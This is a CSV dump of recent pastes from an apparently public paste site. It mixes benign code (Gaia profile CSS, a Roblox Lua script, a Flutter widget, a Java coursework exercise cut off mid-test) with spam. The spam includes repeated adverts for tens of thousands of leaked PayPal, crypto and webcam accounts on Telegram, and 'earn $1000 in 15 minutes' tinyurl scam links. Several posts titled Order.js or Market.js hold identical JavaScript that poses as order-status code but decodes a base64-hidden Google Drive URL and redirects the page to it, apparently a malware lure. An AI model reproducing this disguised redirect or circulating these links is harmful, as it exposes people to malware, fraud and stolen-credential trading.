id,title,username,language,date,content
NjQY16Ad,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 28th of April 2025 07:02:23 AM CDT,32655 Accounts Posted On https://t.me/leakedbyem1nem
2e5H3e9q,Order.js,luqlegal,JavaScript,Monday 28th of April 2025 07:00:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77684/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yR8cs5ju,EARN $900 INSTANTLY 2025 95,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:59:22 AM CDT," 
Pdf https://tinyurl.com/freshleaks

51Yw1pKH8k
"
va44i8X3,Re-Code for Star HeaIer,althindor,CSS,Monday 28th of April 2025 06:56:04 AM CDT,"/* Design by Star HeaIer */
/* Re-Coded by AlthIndor */

html, body {
    background: url('https://i.imgur.com/NmXALhC.png') repeat center top #D8E48D;
    min-height: 1095px;
}
body {position: relative;}

body a {
    text-decoration: none;
    transition: all .5s ease-in-out;
}

#gaia_header a, .panel a {
    color: green !important;
    font-weight: 600 !important;
}
#gaia_header a:hover, .panel a:hover {text-decoration: line-through !important;}
.panel a:hover {color: inherit !important;}

* {cursor: url('https://i.imgur.com/kc9xjRz.png'), default !important;}
.bbcode-swapping-image {mix-blend-mode: multiply;}

/* Fonts */

@font-face {
    font-family: 'Open Sans';
    font-style: normal;
    font-weight: 300 800;
    font-stretch: 100%;
    src: url(https://fonts.gstatic.com/s/opensans/v40/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSGmu1aB.woff2) format('woff2');
}

@font-face {
    font-family: 'Open Sans';
    font-style: normal;
    font-weight: 300 800;
    font-stretch: 100%;
    src: url(https://fonts.gstatic.com/s/opensans/v40/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS-muw.woff2) format('woff2');
}

/* Header */

#gaia_header, #gaia_header ul {background: none !important;}
#gaia_header ul, #gaia_header li {margin: 0 5px !important;}
#gaia_header li.spacer {display: none !important;}

#gaia_header ul {
    width: auto !important;
    font: 400 0/29px 'Open Sans', sans-serif !important;
}

#gaia_header #header_right {
    float: right;
    margin: 0 8px 0 0 !important;
}

#gaia_header a {font-size: 10px !important;}
#gaia_header a:hover {opacity: .5;}

#header_left img {
    -webkit-mask: url('https://i.imgur.com/5FTB40o.png') 0 0 no-repeat;
    mask: url('https://i.imgur.com/5FTB40o.png') 0 0 no-repeat;
    background: currentColor;
    width: 0;
    height: 16px;
    padding: 0 37px 0 0;
}

/* Columns */

#columns, #pictures_container, #texts_container {
    top: 100px;
    left: calc(50% - (910px / 2));
}
#pictures_container, #texts_container {position: absolute;}

#columns {
    background: url('https://i.imgur.com/wkWDZOv.png') -22px -8px;
    width: 910px;
    height: 895px;
}
#columns .column {display: contents;}

/* Scrollbars */

#columns ::-webkit-scrollbar, #columns ::-webkit-scrollbar-thumb {
    width: 8px;
    border-radius: 4px;
}
#columns ::-webkit-scrollbar {background: #00800010;}
#columns ::-webkit-scrollbar-thumb {background: green;}

@supports not selector(::-webkit-scrollbar) {
    .panel, dl {
        scrollbar-color: green #00800010;
        scrollbar-width: thin;
    }
}

/* Panels */

.panel {
    background: none;
    color: #316F94;
    font: 10px/1.65 'Open Sans', sans-serif;
    margin: 0;
    padding: 0;
    position: absolute;
    box-sizing: border-box;
}
.panel h2 {display: none;}
.panel img {max-width: 100% !important;}

#id_footprints, #id_wishlist, #id_about, #id_comments dl {overflow: hidden scroll;}
#id_footprints, #id_about, #id_comments dl {padding-right: 10px;}

#id_footprints, #id_wishlist {
    width: 151px;
    height: 181px;
    top: 148px;
}
#id_footprints {left: 540px;}
#id_wishlist {left: 722px;}

#id_about, #id_comments {
    width: 438px;
    height: 215px;
    left: 378px;
}
#id_about {top: 375px;}
#id_comments {top: 622px;}

/* Details */

@keyframes AviBounce {
    from {translate: 0 0;}
    to {translate: 0 -15px;}
}

#id_details {
    top: 182px;
    left: 384px;
}
#id_details p:nth-of-type(n+2), .forum_userstatus {display: none;}
#id_details p {margin: 0;}

@media (prefers-reduced-motion: no-preference) {
    #id_details {animation: AviBounce 2.5s ease-in-out infinite alternate;}
}

/* Visitors */

#id_footprints {line-height: 1.2;}

#id_footprints .item {
    display: flex;
    flex-flow: column nowrap;
    margin-top: 1px;
}
#id_footprints .item:nth-of-type(n+2) {margin-top: 7px;}

#id_footprints a {
    display: inline-flex;
    width: max-content;
}

/* Wish List */

#id_wishlist {
    display: flex;
    flex-flow: row wrap;
    gap: 7px 6px;
    scroll-snap-type: y mandatory;
}
#id_wishlist .premium_sparkle {display: none;}

#id_wishlist .item {
    position: relative;
    scroll-snap-align: start;
    scroll-snap-stop: always;
}

#id_wishlist a {
    display: block;
    background: #FFFFFF80;
    width: 30px;
    height: 30px;
    padding: 5px;
    border-radius: 5px;
}
#id_wishlist a:hover {background: #FFFFFF;}

.owner_checkmark {
    background: #FFFFFF;
    margin: 0;
    padding: 1px;
    bottom: 0;
    right: 0;
    border: 1px solid currentColor;
    pointer-events: none;
}

/* Comments */

#id_comments {
    display: grid;
    grid-template: 25px 1fr / 1fr 1fr;
    gap: 10px;
}
#id_comments :is(#alerts_banner, .date a, .avatarImage, .deletecomment, .clear) {display: none;}
#id_comments #alert_container {display: contents;}

#id_comments dl {grid-column: 1/3;}
#id_comments dd {margin: 0 0 10px 0;}
#id_comments dd:last-of-type {margin: 0;}

#id_comments dt {
    text-align: left;
    padding: 0;
    border-bottom: 1px dashed currentColor;
}
#id_comments .date {margin-left: 1ex;}

/* Comments Links */

#id_comments :is(h2 + div, h2 ~ p, h2 + div a, h2 ~ p a) {
    width: 100%;
    height: 100%;
    color: #FFFFFF !important;
}

#id_comments :is(h2 + div, h2 ~ p) {
    background: green;
    line-height: 23px;
    text-align: center;
    border-radius: 5px;
    overflow: hidden;
}

#id_comments :is(h2 + div, h2 ~ p) a {
    display: block;
    font-size: 0;
    text-decoration: none !important;
}
#id_comments :is(h2 + div, h2 ~ p) a:hover {opacity: .5;}

#id_comments :is(h2 + div, h2 ~ p) a::before {font-size: 10px;}
#id_comments h2 + div a::before {content: 'POST NEW COMMENT';}
#id_comments h2 ~ p a::before {content: 'VIEW ALL COMMENTS';}

@supports selector(#id_comments:has(#alert_container)) {
    #id_comments h2 + div::before {
        content: 'COMMENTS DISABLED';
        font-weight: 600;
    }
    #id_comments:has(#alert_container) h2 + div::before {content: unset;}
}

/* Buttons */

#id_contact {
    top: 611px;
    right: 6px;
}
#id_contact li {margin-bottom: 11px;}

#id_contact li * {
    display: block;
    background: url('https://i.imgur.com/I8AAqiL.png') top center no-repeat;
    width: 72px;
    height: 72px;
    font-size: 0;
    border-radius: 50%;
}
#id_contact li:nth-of-type(2) * {background-position-y: -72px;}
#id_contact li:nth-of-type(3) * {background-position-y: -144px;}

#id_contact a:hover {
    opacity: .5;
    rotate: 1turn;
}

/* Media */

.media_panel {
    background: url('https://i.imgur.com/MWTKBXK.gif') center no-repeat !important;
    width: 20px;
    height: 20px !important;
    font-size: 0;
    top: 108px;
    left: 317px;
    overflow: hidden;
}
form .media_panel {overflow: visible;}

.media_panel iframe {
    width: 300px;
    height: 200px;
    position: absolute;
    bottom: calc(50% - 20px);
    left: calc(50% - 35px);
    opacity: .001;
}

/* Avatars */

.avatar_decoration {left: 841px !important;}
.avatar_decoration:nth-child(1) {top: 362px !important;}
.avatar_decoration:nth-child(2) {top: 421px !important;}
.avatar_decoration:nth-child(3) {top: 480px !important;}
.avatar_decoration:nth-child(4) {top: 539px !important;}

.avatar_decoration img[width='48'] {
    background: gainsboro;
    border: 3px solid #1CAC1C;
    border-radius: 50%;
    transition: rotate .5s ease-in-out;
}
.avatar_decoration img[width='48']:hover {rotate: 1turn;}"
PYeDeqyF,Make $1000 15-MINUTES (BEGINNER) L4,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:50:07 AM CDT," 
Pdf https://tinyurl.com/freshleaks

HvvM8HOJcK
"
GsLch33v,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:47:00 AM CDT,93457 Accounts Posted On https://t.me/leakedbyem1nem
MDiuukHd,Market.js,luqlegal,JavaScript,Monday 28th of April 2025 06:45:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16566/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
n3645WrQ,EARN $900 INSTANTLY 2025⭐ GV,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:40:48 AM CDT," 
Pdf https://tinyurl.com/freshleaks

DphTTEwz84
"
YHP7cMRC,Crypto Accounts,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:31:38 AM CDT,48609 Accounts Posted On https://t.me/leakedbyem1nem
AWBTuw1x,Make $1000 15-MINUTES  (BEGINNER) YR,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:31:34 AM CDT," 
Pdf https://tinyurl.com/freshleaks

wDqRur7Mus
"
V3a9vxkX,Untitled,luqlegal,JavaScript,Monday 28th of April 2025 06:30:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26216/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iu2J1MN0,EARN $900 INSTANTLY 2025 95,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:22:18 AM CDT," 
Pdf https://tinyurl.com/freshleaks

jlwwn0GvH3
"
VZbreGFj,PayPal with Balance,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:16:14 AM CDT,53521 Accounts Posted On https://t.me/leakedbyem1nem
GSncqsVC,Products.js,luqlegal,JavaScript,Monday 28th of April 2025 06:14:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94825/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MEC9HzdR,Make $1000 15-MINUTES (BEGINNER) L4,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:13:05 AM CDT," 
Pdf https://tinyurl.com/freshleaks

vSoJfBzykL
"
dTh5xQQv,Fixed Daily Rewards Server Script,Cakey3101,Lua,Monday 28th of April 2025 06:10:53 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Remotes = ReplicatedStorage.Remotes
local DailyRewardConfig = require(ReplicatedStorage.DailyRewards)

local function ClaimReward(Player: Player, Day: number)
	local DailyRewardsStat = Player:FindFirstChild(""DailyReward"")
	local LastCollectTimeStat = Player:FindFirstChild(""LastCollectTime"")
	local Leaderstats = Player:FindFirstChild(""leaderstats"")
	
	local CurrentDay = DailyRewardsStat.Value
	local LastCollectTime = LastCollectTimeStat.Value
	local CurrentTime = os.time()
	
	if CurrentDay ~= Day then return end
	if LastCollectTime ~= 0 and CurrentTime - LastCollectTime < 24 * 60 * 60 then return end
	
	local Reward = DailyRewardConfig[tostring(Day)]
	if not Reward then return end
	
	local RewardStat = Leaderstats:FindFirstChild(Reward.Type)
	if RewardStat and RewardStat:IsA(""NumberValue"") then
		RewardStat.Value += Reward.Amount
		print(""Reward Claimed!"")
	end
	
	LastCollectTimeStat.Value = CurrentTime
	DailyRewardsStat.Value = CurrentDay + 1
	
	Remotes.ClaimDailyReward:FireClient(Player)
end

Remotes.ClaimDailyReward.OnServerEvent:Connect(ClaimReward)"
AEzaW0hs,card flutter,muhaiminurabir,Dart,Monday 28th of April 2025 06:06:23 AM CDT,"Card(
                            color: ProjectColors.gray8,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.all(
                                Radius.circular(10),
                              ),
                            ),
                            child: Padding(
                              padding: EdgeInsets.all(5),
                              child: Row(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  Text(
                                    context
                                        .read<FarmProvider>()
                                        .activeFarms!
                                        .orders!
                                        .data![position]
                                        .attributes
                                        ?.totalReturn ??
                                        """",
                                    style: GoogleFonts.poppins(
                                      fontSize: 8.0,
                                      fontWeight: FontWeight.w400,
                                      color: ProjectColors.black,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                  Padding(
                                    padding: EdgeInsets.fromLTRB(5, 0, 5, 0),
                                    child: SizedBox(
                                      height: 7,
                                      child: Container(
                                        width: 1,
                                        height: 5,
                                        color: Color(0xFFD1D1D1),
                                      ),
                                    ),
                                  ),
                                  Text(
                                    context
                                        .read<FarmProvider>()
                                        .activeFarms!
                                        .orders!
                                        .data![position]
                                        .attributes
                                        ?.farm
                                        ?.duration ??
                                        """",
                                    style: GoogleFonts.poppins(
                                      fontSize: 8.0,
                                      fontWeight: FontWeight.w400,
                                      color: ProjectColors.black,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                ],
                              ),
                            ),
                          )"
NjnRgVtC,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:00:52 AM CDT,36008 Accounts Posted On https://t.me/leakedbyem1nem
A4jT0hQQ,dataNone,TestGuy1,JSON,Monday 28th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'f8762f1f703610484cac9c58e880af78d8763a508b42c6be29b737e83ffa185fb4fea187c335e34b4021927903d851c0a10e85ca4c12c93f45c3644136a9b96820f838c280c935eca2241b23c2db4dadc47754241dd495119510b3bb261ebee75b218527471486a2ffcf78b25265b78b63417ed83064d92f88b036ea5767628e',
  otherdata: [
    '754ddfc8b430a3c09d8851515cfc8dea',
    '6907ddb57bc101231821b233e23f89c7',
    'd941ea05366dd1113a0d21ead1e60bdf',
    'c09bbe4fb113ac13b5f970813bedfd92',
    '632a9dff34156b190e3833c912f37eb5',
    '6294ce21c23dea22dbb1a8416808c224',
    '64ba72ced74c86ae33516c98310b2c0f',
    '06800ce16a256b6d11983a938148b98f'
  ]
}"
7jKBvcEW,Order.js,luqlegal,JavaScript,Monday 28th of April 2025 05:59:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02091/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hUUZ83Gk,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 28th of April 2025 05:45:31 AM CDT,11329 Accounts Posted On https://t.me/leakedbyem1nem
xdq6tgc1,Market.js,luqlegal,JavaScript,Monday 28th of April 2025 05:44:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30088/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VWzTfmd4,[NP] Graduation,dzocesrce,Java,Monday 28th of April 2025 05:39:07 AM CDT,"//package mk.ukim.finki.vtor_kolokvium;

import java.util.*;
import java.util.function.Function;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.stream.Collectors;
class OperationNotAllowedException extends Exception{
    public OperationNotAllowedException(String message) {
        super(message);
    }
}
class StudentThree extends Student{
    Map<Integer, List<Course>> coursesByTerm;
    boolean isGraduated;
    public StudentThree(String id) {
        super(id);
        coursesByTerm = new TreeMap<>();
        for(int i=1;i<7;i++)
            coursesByTerm.put(i, new ArrayList<>());
        this.isGraduated = false;
    }

    @Override
    public String getLog() {
        return String.format(""Student with ID %s graduated with average grade %.2f in 3 years."",
                super.getId(),getAverageGrade());
    }

    public boolean isGraduated() {
        return isGraduated;
    }

    public int getNumberOfExamsPassed(){
        return coursesByTerm.values().stream().mapToInt(i->i.size()).sum();
    }

    @Override
    public double getAverageGrade() {
        return coursesByTerm.values().stream().flatMap(list->list.stream()).mapToDouble(i->i.getGrade())
                .average().orElse(5);
    }

    public String getDetailedReport(){
        StringBuilder stringBuilder= new StringBuilder();
        stringBuilder.append(String.format(""Student: %s\n"",super.getId()));
        for(int i=1;i<7;i++){
            stringBuilder.append(String.format(""Term %d\n"",i));
            stringBuilder.append(String.format(""Courses: %d\n"",coursesByTerm.get(i).size()));
            stringBuilder.append(String.format(""Average grade for term: %.2f\n"",
                    coursesByTerm.get(i).stream().mapToDouble(j->j.getGrade()).average().orElse(5.0)));
        }
        stringBuilder.append(String.format(""Average grade: %.2f\n"",getAverageGrade()));
        stringBuilder.append(String.format(""Courses attended: %s\n"",
                coursesByTerm.values().stream().flatMap(list->list.stream()).map(j->j.getName())
                        .sorted(Comparator.naturalOrder()).collect(Collectors.joining("",""))));
        return stringBuilder.toString().trim();
    }

    @Override
    public void addGrade(int term, String courseName, int grade) throws OperationNotAllowedException {
        if(term>6)
            throw new OperationNotAllowedException(String.format
                    (""Term %d is not possible for student with ID %s"",term,super.getId()));
        if(coursesByTerm.containsKey(term)&&coursesByTerm.get(term).size()==3)
            throw new OperationNotAllowedException(String.format
                    (""Student %s already has 3 grades in term %d"",super.getId(),term));
        if(isGraduated){
            return ;
        }

        coursesByTerm.putIfAbsent(term,new ArrayList<>());
        coursesByTerm.get(term).add(new Course(courseName,grade));
        if(getNumberOfExamsPassed()==18)
            isGraduated = true;

    }

    @Override
    public String toString() {
        return String.format(""Student: %s Courses passed: %d Average grade: %.2f"",
                super.getId(),getNumberOfExamsPassed(),getAverageGrade());
    }

    @Override
    public int compareTo(Student o) {
        return Comparator.comparing(Student::getNumberOfExamsPassed,Comparator.reverseOrder())
                .thenComparing(Student::getAverageGrade,Comparator.reverseOrder())
                .thenComparing(Student::getId,Comparator.reverseOrder())
                .compare(this,o);
    }
}

class StudentFour extends Student{
    Map<Integer, List<Course>> coursesByTerm;
    boolean isGraduated;
    public StudentFour(String id) {
        super(id);
        coursesByTerm = new TreeMap<>();
        for(int i=1;i<9;i++)
            coursesByTerm.put(i, new ArrayList<>());
        isGraduated= false;
    }

    @Override
    public String getLog() {
        return String.format(""Student with ID %s graduated with average grade %.2f in 4 years."",
                super.getId(),getAverageGrade());
    }

    @Override
    public boolean isGraduated() {
        return isGraduated;
    }


    public int getNumberOfExamsPassed(){
        return coursesByTerm.values().stream().mapToInt(i->i.size()).sum();
    }

    @Override
    public double getAverageGrade() {
        return coursesByTerm.values().stream().flatMap(list->list.stream()).mapToDouble(i->i.getGrade())
                .average().orElse(5);
    }

    @Override
    public void addGrade(int term, String courseName, int grade) throws OperationNotAllowedException {
        if(term>8)
            throw new OperationNotAllowedException(String.format
                    (""Term %d is not possible for student with ID %s"",term,super.getId()));
        if(coursesByTerm.containsKey(term)&&coursesByTerm.get(term).size()==3)
            throw new OperationNotAllowedException(String.format
                    (""Student %s already has 3 grades in term %d"",super.getId(),term));
        if(isGraduated){
            return ;
        }

        coursesByTerm.putIfAbsent(term,new ArrayList<>());
        coursesByTerm.get(term).add(new Course(courseName,grade));
        if(getNumberOfExamsPassed()==24)
            isGraduated = true;
    }

    @Override
    public int compareTo(Student o) {
        return Comparator.comparing(Student::getNumberOfExamsPassed,Comparator.reverseOrder())
                .thenComparing(Student::getAverageGrade,Comparator.reverseOrder())
                .thenComparing(Student::getId,Comparator.reverseOrder())
                .compare(this,o);
    }


    public String getDetailedReport(){
        StringBuilder stringBuilder= new StringBuilder();
        stringBuilder.append(String.format(""Student: %s\n"",super.getId()));
        for(int i=1;i<9;i++){
            stringBuilder.append(String.format(""Term %d\n"",i));
            stringBuilder.append(String.format(""Courses: %d\n"",coursesByTerm.get(i).size()));
            stringBuilder.append(String.format(""Average grade for term: %.2f\n"",
                    coursesByTerm.get(i).stream().mapToDouble(j->j.getGrade()).average().orElse(5.0)));
        }
        stringBuilder.append(String.format(""Average grade: %.2f\n"",getAverageGrade()));
        stringBuilder.append(String.format(""Courses attended: %s\n"",
                coursesByTerm.values().stream().flatMap(list->list.stream()).map(j->j.getName())
                        .sorted(Comparator.naturalOrder()).collect(Collectors.joining("",""))));
        return stringBuilder.toString().trim();
    }

    @Override
    public String toString() {
        return String.format(""Student: %s Courses passed: %d Average grade: %.2f"",
                super.getId(),getNumberOfExamsPassed(),getAverageGrade());
    }
}

abstract class Student implements Comparable<Student> {
    private String id;

    public Student(String id) {
        this.id = id;
    }

    public String getId() {
        return id;
    }

    public abstract String getLog();

    public abstract boolean isGraduated();

    public abstract String getDetailedReport();

    public abstract int getNumberOfExamsPassed();

    public abstract double getAverageGrade();

    public abstract void addGrade(int term, String courseName, int grade) throws OperationNotAllowedException;
}
class Faculty {
    List<Student> logs;
    Map<String,Student> students;
    Map<String,List<Integer>> studentsOnCourses;
    public Faculty() {
    students= new HashMap<>();
    logs= new ArrayList<>();
    studentsOnCourses= new HashMap<>();
    }

    void addStudent(String id, int yearsOfStudies) {
        if(yearsOfStudies==3)
            students.putIfAbsent(id,(new StudentThree(id)));
        else{
            students.putIfAbsent(id,(new StudentFour(id)));
        }
    }

    void addGradeToStudent(String studentId, int term, String courseName, int grade) throws OperationNotAllowedException {
        students.get(studentId).addGrade(term,courseName,grade);
        studentsOnCourses.putIfAbsent(courseName,new ArrayList<>());
        studentsOnCourses.get(courseName).add(grade);

    }


    String getFacultyLogs() {

        logs = students.values().stream().filter(i->i.isGraduated()).collect(Collectors.toList());
        students= students.values().stream().filter(i->!i.isGraduated()).collect(Collectors.toMap(
                value->value.getId(),
                value->value
        ));
        return logs.stream().sorted(Comparator.comparing(Student::getId))
                .map(i-> i.getLog()).collect(Collectors.joining(""\n""));
    }

    String getDetailedReportForStudent(String id) {
        return students.get(id).getDetailedReport();

    }

    void printFirstNStudents(int n) {
        students.values().stream().sorted().limit(n).forEach(System.out::println);

    }
    void printCourses() {
        studentsOnCourses.entrySet().stream().sorted(Comparator
                        .comparing((Map.Entry<String, List<Integer>> entry) ->
                                        entry.getValue().size(),Comparator.naturalOrder())
                        .thenComparing(entry ->
                                entry.getValue().stream().mapToDouble(j->j)
                                        .average().orElse(5.0),Comparator.naturalOrder())
                        .thenComparing(entry->entry.getKey()))

                .forEach(i-> System.out.println(String.format(""%s %d %.2f"",
                        i.getKey(),i.getValue().size(),
                        i.getValue().stream().mapToDouble(j->j).average().orElse(5.0))));

    }
}


class Course {
    String name;
    int grade;

    public Course(String name, int grade) {
        this.name = name;
        this.grade = grade;
    }

    public String getName() {
        return name;
    }

    public int getGrade() {
        return grade;
    }
}


public class FacultyTest {

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int testCase = sc.nextInt();

        if (testCase == 1) {
            System.out.println(""TESTING addStudent AND printFirstNStudents"");
            Faculty faculty = new Faculty();
            for (int i = 0; i < 10; i++) {
                faculty.addStudent(""student"" + i, (i % 2 == 0) ? 3 : 4);
            }
            faculty.printFirstNStudents(10);

        } else if (testCase == 2) {
            System.out.println(""TESTING addGrade and exception"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""123"", 3);
            faculty.addStudent(""1234"", 4);
            try {
                faculty.addGradeToStudent(""123"", 7, ""NP"", 10);
            } catch (OperationNotAllowedException e) {
                System.out.println(e.getMessage());
            }
            try {
                faculty.addGradeToStudent(""1234"", 9, ""NP"", 8);
            } catch (OperationNotAllowedException e) {
                System.out.println(e.getMessage());
            }
        } else if (testCase == 3) {
            System.out.println(""TESTING addGrade and exception"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""123"", 3);
            faculty.addStudent(""1234"", 4);
            for (int i = 0; i < 4; i++) {
                try {
                    faculty.addGradeToStudent(""123"", 1, ""course"" + i, 10);
                } catch (OperationNotAllowedException e) {
                    System.out.println(e.getMessage());
                }
            }
            for (int i = 0; i < 4; i++) {
                try {
                    faculty.addGradeToStudent(""1234"", 1, ""course"" + i, 10);
                } catch (OperationNotAllowedException e) {
                    System.out.println(e.getMessage());
                }
            }
        } else if (testCase == 4) {
            System.out.println(""Testing addGrade for graduation"");
            Faculty faculty = new Faculty();
            faculty.addStudent(""123"", 3);
            faculty.addStudent(""1234"", 4);
            int counter = 1;
            for (int i = 1; i <= 6; i++) {
                for (int j = 1; j <= 3; j++) {
                    try {
                        faculty.addGradeToStudent(""123"", i, ""course"" + counter, (i % 2 == 0) ? 7 : 8);
                    } catch (OperationNotAllowedException e) {
                        System.out.println(e.getMessage());
                    }
                    ++counter;
                }
            }
            counter = 1;
